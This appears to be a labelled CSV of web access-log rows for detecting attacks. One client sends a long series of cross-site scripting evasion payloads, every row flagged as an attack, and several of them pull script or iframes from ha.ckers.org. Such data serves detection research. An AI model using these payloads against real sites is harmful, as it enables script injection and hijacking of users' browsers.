"","ip","date","hour","minute","seconds","zone","request1","request2","status","respsize","attaque"
"150","192.108.116.88","18/Dec/2017","14","05","38","+0000","POST ","datalab HTTP/1.1/NA/datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> ",200,1073,1
"151","192.108.116.88","18/Dec/2017","14","05","38","+0000","GET ","css/index.css HTTP/1.1/datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> ",304,NA,1
"152","192.108.116.88","18/Dec/2017","14","05","38","+0000","GET ","img/logo.png HTTP/1.1/datalab #0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041> ",304,NA,1
"153","192.108.116.88","18/Dec/2017","14","06","03","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> ",200,1040,1
"154","192.108.116.88","18/Dec/2017","14","06","03","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> ",200,945,1
"155","192.108.116.88","18/Dec/2017","14","06","03","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> ",200,34463,1
"156","192.108.116.88","18/Dec/2017","14","06","04","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> ",200,1073,1
"157","192.108.116.88","18/Dec/2017","14","06","04","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> ",304,NA,1
"158","192.108.116.88","18/Dec/2017","14","06","04","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29> ",304,NA,1
"159","192.108.116.88","18/Dec/2017","14","06","31","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=""jav	ascript:alert('XSS');""> ",200,1040,1
"160","192.108.116.88","18/Dec/2017","14","06","31","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""jav	ascript:alert('XSS');""> ",200,945,1
"161","192.108.116.88","18/Dec/2017","14","06","31","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""jav	ascript:alert('XSS');""> ",200,34463,1
"162","192.108.116.88","18/Dec/2017","14","06","32","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""jav	ascript:alert('XSS');""> ",200,1073,1
"163","192.108.116.88","18/Dec/2017","14","06","33","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""jav	ascript:alert('XSS');""> ",304,NA,1
"164","192.108.116.88","18/Dec/2017","14","06","33","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""jav	ascript:alert('XSS');""> ",304,NA,1
"165","192.108.116.88","18/Dec/2017","14","06","57","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=""jav&#x09;ascript:alert('XSS');""> ",200,1040,1
"166","192.108.116.88","18/Dec/2017","14","06","57","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""jav&#x09;ascript:alert('XSS');""> ",200,945,1
"167","192.108.116.88","18/Dec/2017","14","06","57","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""jav&#x09;ascript:alert('XSS');""> ",200,34463,1
"168","192.108.116.88","18/Dec/2017","14","08","57","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""jav&#x09;ascript:alert('XSS');""> ",NA,NA,1
"169","192.108.116.88","18/Dec/2017","14","10","58","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""jav&#x09;ascript:alert('XSS');""> ",NA,NA,1
"170","192.108.116.88","18/Dec/2017","14","11","17","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=""jav&#x0A;ascript:alert('XSS');""> ",200,1040,1
"171","192.108.116.88","18/Dec/2017","14","11","17","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""jav&#x0A;ascript:alert('XSS');""> ",200,945,1
"172","192.108.116.88","18/Dec/2017","14","11","17","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""jav&#x0A;ascript:alert('XSS');""> ",200,34463,1
"173","192.108.116.88","18/Dec/2017","14","13","17","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""jav&#x0A;ascript:alert('XSS');""> ",NA,NA,1
"174","192.108.116.88","18/Dec/2017","14","15","17","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""jav&#x0A;ascript:alert('XSS');""> ",NA,NA,1
"175","192.108.116.88","18/Dec/2017","14","15","36","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=""jav&#x0D;ascript:alert('XSS');""> ",200,1040,1
"176","192.108.116.88","18/Dec/2017","14","15","36","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""jav&#x0D;ascript:alert('XSS');""> ",200,945,1
"177","192.108.116.88","18/Dec/2017","14","15","36","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""jav&#x0D;ascript:alert('XSS');""> ",200,34463,1
"178","192.108.116.88","18/Dec/2017","14","17","36","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""jav&#x0D;ascript:alert('XSS');""> ",NA,NA,1
"179","192.108.116.88","18/Dec/2017","14","19","36","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""jav&#x0D;ascript:alert('XSS');""> ",NA,NA,1
"180","192.108.116.88","18/Dec/2017","14","19","57","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC= &#14;",200,1040,1
"181","192.108.116.88","18/Dec/2017","14","19","57","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC= &#14;",200,945,1
"182","192.108.116.88","18/Dec/2017","14","19","57","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC= &#14;",200,34463,1
"183","192.108.116.88","18/Dec/2017","14","21","57","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC= &#14;",NA,NA,1
"184","192.108.116.88","18/Dec/2017","14","23","57","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC= &#14;",NA,NA,1
"185","192.108.116.88","18/Dec/2017","14","24","13","+0000","GET "," HTTP/1.1/NA/datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",200,1040,1
"186","192.108.116.88","18/Dec/2017","14","24","13","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",200,945,1
"187","192.108.116.88","18/Dec/2017","14","24","13","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",200,34463,1
"188","192.108.116.88","18/Dec/2017","14","24","14","+0000","POST ","datalab HTTP/1.1/NA/datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",200,1073,1
"189","192.108.116.88","18/Dec/2017","14","24","14","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",304,NA,1
"190","192.108.116.88","18/Dec/2017","14","24","14","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",304,NA,1
"191","192.108.116.88","18/Dec/2017","14","24","33","+0000","GET "," HTTP/1.1/NA/datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> ",200,1040,1
"192","192.108.116.88","18/Dec/2017","14","24","33","+0000","GET ","css/index.css HTTP/1.1/datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> ",200,945,1
"193","192.108.116.88","18/Dec/2017","14","24","33","+0000","GET ","img/logo.png HTTP/1.1/datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> ",200,34463,1
"194","192.108.116.88","18/Dec/2017","14","24","34","+0000","POST ","datalab HTTP/1.1/NA/datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> ",200,1073,1
"195","192.108.116.88","18/Dec/2017","14","24","34","+0000","GET ","css/index.css HTTP/1.1/datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> ",304,NA,1
"196","192.108.116.88","18/Dec/2017","14","24","34","+0000","GET ","img/logo.png HTTP/1.1/datalab <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")> ",304,NA,1
"197","192.108.116.88","18/Dec/2017","14","24","50","+0000","GET "," HTTP/1.1/NA/datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",200,1040,1
"198","192.108.116.88","18/Dec/2017","14","24","50","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",200,945,1
"199","192.108.116.88","18/Dec/2017","14","24","50","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",200,34463,1
"200","192.108.116.88","18/Dec/2017","14","24","51","+0000","POST ","datalab HTTP/1.1/NA/datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",200,1073,1
"201","192.108.116.88","18/Dec/2017","14","24","51","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",304,NA,1
"202","192.108.116.88","18/Dec/2017","14","24","51","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT> ",304,NA,1
"203","192.108.116.88","18/Dec/2017","14","25","10","+0000","GET "," HTTP/1.1/NA/datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> ",200,1040,1
"204","192.108.116.88","18/Dec/2017","14","25","10","+0000","GET ","css/index.css HTTP/1.1/datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> ",200,945,1
"205","192.108.116.88","18/Dec/2017","14","25","10","+0000","GET ","img/logo.png HTTP/1.1/datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> ",200,34463,1
"206","192.108.116.88","18/Dec/2017","14","25","11","+0000","POST ","datalab HTTP/1.1/NA/datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> ",200,1073,1
"207","192.108.116.88","18/Dec/2017","14","25","11","+0000","GET ","css/index.css HTTP/1.1/datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> ",304,NA,1
"208","192.108.116.88","18/Dec/2017","14","25","11","+0000","GET ","img/logo.png HTTP/1.1/datalab <<SCRIPT>alert(""XSS"");//<</SCRIPT> ",304,NA,1
"209","192.108.116.88","18/Dec/2017","14","25","27","+0000","GET "," HTTP/1.1/NA/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > ",200,1040,1
"210","192.108.116.88","18/Dec/2017","14","25","27","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > ",200,945,1
"211","192.108.116.88","18/Dec/2017","14","25","27","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > ",200,34463,1
"212","192.108.116.88","18/Dec/2017","14","25","28","+0000","POST ","datalab HTTP/1.1/NA/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > ",200,1073,1
"213","192.108.116.88","18/Dec/2017","14","25","28","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > ",304,NA,1
"214","192.108.116.88","18/Dec/2017","14","25","28","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT SRC=http://ha.ckers.org/xss.js?< B > ",304,NA,1
"215","192.108.116.88","18/Dec/2017","14","25","54","+0000","GET "," HTTP/1.1/NA/datalab <SCRIPT SRC=//ha.ckers.org/.j> ",200,1040,1
"216","192.108.116.88","18/Dec/2017","14","25","54","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT SRC=//ha.ckers.org/.j> ",200,945,1
"217","192.108.116.88","18/Dec/2017","14","25","54","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT SRC=//ha.ckers.org/.j> ",200,34463,1
"218","192.108.116.88","18/Dec/2017","14","25","55","+0000","POST ","datalab HTTP/1.1/NA/datalab <SCRIPT SRC=//ha.ckers.org/.j> ",200,1073,1
"219","192.108.116.88","18/Dec/2017","14","25","55","+0000","GET ","css/index.css HTTP/1.1/datalab <SCRIPT SRC=//ha.ckers.org/.j> ",304,NA,1
"220","192.108.116.88","18/Dec/2017","14","25","55","+0000","GET ","img/logo.png HTTP/1.1/datalab <SCRIPT SRC=//ha.ckers.org/.j> ",304,NA,1
"221","192.108.116.88","18/Dec/2017","14","26","15","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS') ",200,1040,1
"222","192.108.116.88","18/Dec/2017","14","26","15","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""javascript:alert('XSS') ",200,945,1
"223","192.108.116.88","18/Dec/2017","14","26","15","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""javascript:alert('XSS') ",200,34463,1
"224","192.108.116.88","18/Dec/2017","14","28","15","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS') ",NA,NA,1
"225","192.108.116.88","18/Dec/2017","14","30","15","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""javascript:alert('XSS') ",NA,NA,1
"226","192.108.116.88","18/Dec/2017","14","30","34","+0000","GET "," HTTP/1.1/NA/datalab <iframe src=http://ha.ckers.org/scriptlet.html < ",200,1040,1
"227","192.108.116.88","18/Dec/2017","14","30","34","+0000","GET ","css/index.css HTTP/1.1/datalab <iframe src=http://ha.ckers.org/scriptlet.html < ",200,945,1
"228","192.108.116.88","18/Dec/2017","14","30","34","+0000","GET ","img/logo.png HTTP/1.1/datalab <iframe src=http://ha.ckers.org/scriptlet.html < ",200,34463,1
"229","192.108.116.88","18/Dec/2017","14","30","35","+0000","POST ","datalab HTTP/1.1/NA/datalab <iframe src=http://ha.ckers.org/scriptlet.html < ",200,1073,1
"230","192.108.116.88","18/Dec/2017","14","30","35","+0000","GET ","css/index.css HTTP/1.1/datalab <iframe src=http://ha.ckers.org/scriptlet.html < ",304,NA,1
"231","192.108.116.88","18/Dec/2017","14","30","35","+0000","GET ","img/logo.png HTTP/1.1/datalab <iframe src=http://ha.ckers.org/scriptlet.html < ",304,NA,1
"232","192.108.116.88","18/Dec/2017","14","30","52","+0000","GET "," HTTP/1.1/NA/datalab \"";alert('XSS');// ",200,1040,1
"233","192.108.116.88","18/Dec/2017","14","30","53","+0000","GET ","css/index.css HTTP/1.1/datalab \"";alert('XSS');// ",200,945,1
"234","192.108.116.88","18/Dec/2017","14","30","53","+0000","GET ","img/logo.png HTTP/1.1/datalab \"";alert('XSS');// ",200,34463,1
"235","192.108.116.88","18/Dec/2017","14","32","53","+0000","POST ","datalab HTTP/1.1/NA/datalab \"";alert('XSS');// ",NA,NA,1
"236","192.108.116.88","18/Dec/2017","14","34","53","+0000","POST ","datalab HTTP/1.1/NA/datalab \"";alert('XSS');// ",NA,NA,1
"237","192.108.116.88","18/Dec/2017","14","35","14","+0000","GET "," HTTP/1.1/NA/datalab </script><script>alert('XSS');</script> ",200,1040,1
"238","192.108.116.88","18/Dec/2017","14","35","15","+0000","GET ","css/index.css HTTP/1.1/datalab </script><script>alert('XSS');</script> ",200,945,1
"239","192.108.116.88","18/Dec/2017","14","35","15","+0000","GET ","img/logo.png HTTP/1.1/datalab </script><script>alert('XSS');</script> ",200,34463,1
"240","192.108.116.88","18/Dec/2017","14","37","15","+0000","POST ","datalab HTTP/1.1/NA/datalab </script><script>alert('XSS');</script> ",NA,NA,1
"241","192.108.116.88","18/Dec/2017","14","39","15","+0000","POST ","datalab HTTP/1.1/NA/datalab </script><script>alert('XSS');</script> ",NA,NA,1
"242","192.108.116.88","18/Dec/2017","14","39","35","+0000","GET "," HTTP/1.1/NA/datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> ",200,1040,1
"243","192.108.116.88","18/Dec/2017","14","39","35","+0000","GET ","css/index.css HTTP/1.1/datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> ",200,945,1
"244","192.108.116.88","18/Dec/2017","14","39","36","+0000","GET ","img/logo.png HTTP/1.1/datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> ",200,34463,1
"245","192.108.116.88","18/Dec/2017","14","39","36","+0000","POST ","datalab HTTP/1.1/NA/datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> ",200,1073,1
"246","192.108.116.88","18/Dec/2017","14","39","37","+0000","GET ","css/index.css HTTP/1.1/datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> ",304,NA,1
"247","192.108.116.88","18/Dec/2017","14","39","37","+0000","GET ","img/logo.png HTTP/1.1/datalab </TITLE><SCRIPT>alert(""XSS"");</SCRIPT> ",304,NA,1
"248","192.108.116.88","18/Dec/2017","14","39","58","+0000","GET "," HTTP/1.1/NA/datalab <INPUT TYPE=""IMAGE SRC=""javascript:alert('XSS');"">",200,1040,1
"249","192.108.116.88","18/Dec/2017","14","39","58","+0000","GET ","css/index.css HTTP/1.1/datalab <INPUT TYPE=""IMAGE SRC=""javascript:alert('XSS');"">",200,945,1
"250","192.108.116.88","18/Dec/2017","14","39","58","+0000","GET ","img/logo.png HTTP/1.1/datalab <INPUT TYPE=""IMAGE SRC=""javascript:alert('XSS');"">",200,34463,1
"251","192.108.116.88","18/Dec/2017","14","41","58","+0000","POST ","datalab HTTP/1.1/NA/datalab <INPUT TYPE=""IMAGE SRC=""javascript:alert('XSS');"">",NA,NA,1
"252","192.108.116.88","18/Dec/2017","14","43","58","+0000","POST ","datalab HTTP/1.1/NA/datalab <INPUT TYPE=""IMAGE SRC=""javascript:alert('XSS');"">",NA,NA,1
"253","192.108.116.88","18/Dec/2017","14","44","57","+0000","GET "," HTTP/1.1/NA/datalab <BODY BACKGROUND=""javascript:alert('XSS')""> ",200,1040,1
"254","192.108.116.88","18/Dec/2017","14","46","08","+0000","GET ","css/index.css HTTP/1.1/datalab <BODY BACKGROUND=""javascript:alert('XSS')""> ",200,945,1
"255","192.108.116.88","18/Dec/2017","14","46","09","+0000","GET ","img/logo.png HTTP/1.1/datalab <BODY BACKGROUND=""javascript:alert('XSS')""> ",200,34463,1
"256","192.108.116.88","18/Dec/2017","14","48","08","+0000","POST ","datalab HTTP/1.1/NA/datalab <BODY BACKGROUND=""javascript:alert('XSS')""> ",NA,NA,1
"257","192.108.116.88","18/Dec/2017","14","50","09","+0000","POST ","datalab HTTP/1.1/NA/datalab <BODY BACKGROUND=""javascript:alert('XSS')""> ",NA,NA,1
"258","192.108.116.88","18/Dec/2017","14","50","28","+0000","GET "," HTTP/1.1/NA/datalab <IMG DYNSRC=""javascript:alert('XSS')""> ",200,1040,1
"259","192.108.116.88","18/Dec/2017","14","50","28","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG DYNSRC=""javascript:alert('XSS')""> ",200,945,1
"260","192.108.116.88","18/Dec/2017","14","50","28","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG DYNSRC=""javascript:alert('XSS')""> ",200,34463,1
"261","192.108.116.88","18/Dec/2017","14","52","28","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG DYNSRC=""javascript:alert('XSS')""> ",NA,NA,1
"262","192.108.116.88","18/Dec/2017","14","54","29","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG DYNSRC=""javascript:alert('XSS')""> ",NA,NA,1
"263","192.108.116.88","18/Dec/2017","14","54","49","+0000","GET "," HTTP/1.1/NA/datalab <IMG LOWSRC=""javascript:alert('XSS')""> ",200,1040,1
"264","192.108.116.88","18/Dec/2017","14","54","49","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG LOWSRC=""javascript:alert('XSS')""> ",200,945,1
"265","192.108.116.88","18/Dec/2017","14","54","50","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG LOWSRC=""javascript:alert('XSS')""> ",200,34463,1
"266","192.108.116.88","18/Dec/2017","14","56","49","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG LOWSRC=""javascript:alert('XSS')""> ",NA,NA,1
"267","192.108.116.88","18/Dec/2017","14","58","50","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG LOWSRC=""javascript:alert('XSS')""> ",NA,NA,1
"268","192.108.116.88","18/Dec/2017","14","59","12","+0000","GET "," HTTP/1.1/NA/datalab <STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br> ",200,1040,1
"269","192.108.116.88","18/Dec/2017","14","59","12","+0000","GET ","css/index.css HTTP/1.1/datalab <STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br> ",200,945,1
"270","192.108.116.88","18/Dec/2017","14","59","12","+0000","GET ","img/logo.png HTTP/1.1/datalab <STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br> ",200,34463,1
"271","192.108.116.88","18/Dec/2017","15","01","12","+0000","POST ","datalab HTTP/1.1/NA/datalab <STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br> ",NA,NA,1
"272","192.108.116.88","18/Dec/2017","15","03","13","+0000","POST ","datalab HTTP/1.1/NA/datalab <STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br> ",NA,NA,1
"273","192.108.116.88","18/Dec/2017","15","03","31","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC='vbscript:msgbox(""XSS"")'> ",200,1040,1
"274","192.108.116.88","18/Dec/2017","15","03","31","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC='vbscript:msgbox(""XSS"")'> ",200,945,1
"275","192.108.116.88","18/Dec/2017","15","03","32","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC='vbscript:msgbox(""XSS"")'> ",200,34463,1
"276","192.108.116.88","18/Dec/2017","15","05","31","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC='vbscript:msgbox(""XSS"")'> ",NA,NA,1
"277","192.108.116.88","18/Dec/2017","15","07","32","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC='vbscript:msgbox(""XSS"")'> ",NA,NA,1
"278","192.108.116.88","18/Dec/2017","15","07","53","+0000","GET "," HTTP/1.1/NA/datalab <IMG SRC=""livescript:[code]""> ",200,1040,1
"279","192.108.116.88","18/Dec/2017","15","07","54","+0000","GET ","css/index.css HTTP/1.1/datalab <IMG SRC=""livescript:[code]""> ",200,945,1
"280","192.108.116.88","18/Dec/2017","15","07","54","+0000","GET ","img/logo.png HTTP/1.1/datalab <IMG SRC=""livescript:[code]""> ",200,34463,1
"281","192.108.116.88","18/Dec/2017","15","07","55","+0000","POST ","datalab HTTP/1.1/NA/datalab <IMG SRC=""livescript:[code]""> ",200,1073,1
